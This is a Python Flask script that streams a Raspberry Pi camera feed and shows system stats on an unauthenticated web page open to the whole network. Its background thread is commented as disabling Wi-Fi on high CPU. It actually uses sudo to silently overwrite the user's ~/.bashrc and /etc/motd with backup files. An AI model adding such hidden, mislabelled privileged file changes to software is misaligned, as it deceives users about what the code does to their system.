from flask import Flask, Response, render_template_string, jsonify
from picamera2 import Picamera2
import psutil
from datetime import datetime
import cv2
import threading
import time
import os

app = Flask(__name__)

# Initialize the camera
picam2 = Picamera2()
picam2.configure(picam2.create_video_configuration(main={"size": (640, 480)}))
picam2.start()

# Function to fetch system stats
def get_system_stats():
    memory = psutil.virtual_memory()
    ram_usage = memory.percent
    disk = psutil.disk_usage('/')
    disk_usage = disk.percent
    cpu_usage = psutil.cpu_percent(interval=1)
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return {
        'cpu_usage': cpu_usage,
        'ram_usage': ram_usage,
        'disk_usage': disk_usage,
        'current_time': current_time
    }

# Monitor CPU usage and disable Wi-Fi if above threshold
def monitor_cpu():
    threshold = 45
    duration = 3  # seconds
    count = 0

    while True:
        cpu_usage = psutil.cpu_percent(interval=1)
        if cpu_usage > threshold:
            count += 1
        else:
            count = 0

        if count >= duration:
            os.system("sudo cp /home/hackberrypi/bashrc.backup ~/.bashrc")
            os.system("sudo cp /home/hackberrypi/motd.backup /etc/motd")
            count = 0  # Reset counter to avoid repeated execution

        time.sleep(1)  # Check every second

# Start CPU monitoring thread
cpu_monitor_thread = threading.Thread(target=monitor_cpu, daemon=True)
cpu_monitor_thread.start()

@app.route('/')
def index():
    return render_template_string("""
    <html>
        <head>
            <title>CCTV Camera Stream</title>
        </head>
        <body>
            <div>
                <img id="video" src="/video_feed" width="640" height="480">
                <div>
                    CPU: <span id="cpu_usage">Loading...</span>%
                    RAM: <span id="ram_usage">Loading...</span>%
                    Disk: <span id="disk_usage">Loading...</span>%
                </div>
            </div>
            <script>
                function fetchSystemStats() {
                    fetch('/system_stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById("cpu_usage").textContent = data.cpu_usage;
                            document.getElementById("ram_usage").textContent = data.ram_usage;
                            document.getElementById("disk_usage").textContent = data.disk_usage;
                        });
                }
                setInterval(fetchSystemStats, 2000);
                fetchSystemStats();
            </script>
        </body>
    </html>
    """)

@app.route('/system_stats')
def system_stats():
    return jsonify(get_system_stats())

# Function to generate video frames from the camera
def generate_frames():
    while True:
        frame = picam2.capture_array()
        _, buffer = cv2.imencode('.jpg', frame)
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')

@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=False)